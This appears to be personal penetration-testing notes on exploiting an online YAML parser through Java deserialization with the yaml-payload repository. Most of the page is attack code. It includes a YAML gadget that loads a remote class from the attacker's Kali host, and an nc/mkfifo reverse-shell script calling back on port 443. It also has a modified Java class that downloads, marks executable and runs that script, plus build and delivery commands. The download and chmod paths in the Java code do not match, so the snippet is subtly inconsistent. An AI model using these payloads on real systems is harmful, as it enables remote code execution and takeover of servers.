#### Online YAML parser
See https://github.com/artsploit/yaml-payload

![[Pasted image 20220922153442.png]]

```bash - kali
git clone https://github.com/artsploit/yaml-payload
```

![[Python#Server]]

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$KALI/"]
  ]]
]
```

Should see a call back in you python server.
![[Pasted image 20220922153421.png]]

```bash - kali
echo '#!/bin/bash \nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f' > Shelly.sh
```

Modify lines 8 - 17 of `/src/artsploit/AwesomeScriptEngineFactory.java` with the following to upload and execute reverse shell.
```java
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() throws Exception {
        try {
            Process p = Runtime.getRuntime().exec("wget $KALI/Shelly.sh -O /tmp/shell");
			p.waitFor();
			p = Runtime.getRuntime().exec("chmod +x /tmp/Shelly.sh");
			p.waitFor();
			p = Runtime.getRuntime().exec("/tmp/Shelly.sh");
			p.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

```bash - kali
javac src/artsploit/AwesomeScriptEngineFactory.java
```

```bash - kali
jar -cvf yaml-payload.jar -C src/ .
```

[[rlwrap]]

```bash - kali
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$KALI/yaml-payload.jar"]
  ]]
]
```














